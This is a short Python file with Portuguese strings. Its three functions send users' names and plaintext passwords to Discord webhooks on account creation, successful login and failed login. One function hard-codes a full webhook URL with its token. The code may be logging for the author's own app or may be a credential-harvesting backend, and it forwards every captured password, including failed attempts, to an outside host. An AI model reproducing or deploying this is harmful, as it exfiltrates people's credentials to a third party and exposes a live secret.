import requests

def notifier_crg(nome, senha):
    webhook = " " # Sua discord webhook.

    data = {
        "content": f"# NOVA CRIAÇÃO DE CONTA DETECTADA\n - Nome: {nome}\n - Senha: {senha}"
    }

    response = requests.post(webhook, json=data)



def notifier_lgg(nome, senha):
    webhook = " " # Sua discord webhook.

    data = {
        "content": f"# NOVO LOGIN DETECTADO\n - Nome: {nome}\n - Senha: {senha}"
    }

    response = requests.post(webhook, json=data)

def notifierErrorlg(nome, senha):
    webhook = "https://discordapp.com/api/webhooks/1361697482727493632/fBRXvfyqolzHW_i_cTPfqf8PurxZGOTAbY3W_5LwHsUB8YueNIxJG5s-P5zAaIk5Ex1N"

    data = {
        "content": f"# TENTATIVA DE LOGIN DETECTADA (credenciais nao encontradas na database)\n - Nome: {nome}\n - Senha: {senha}"
    }

    response = requests.post(webhook, json=data)

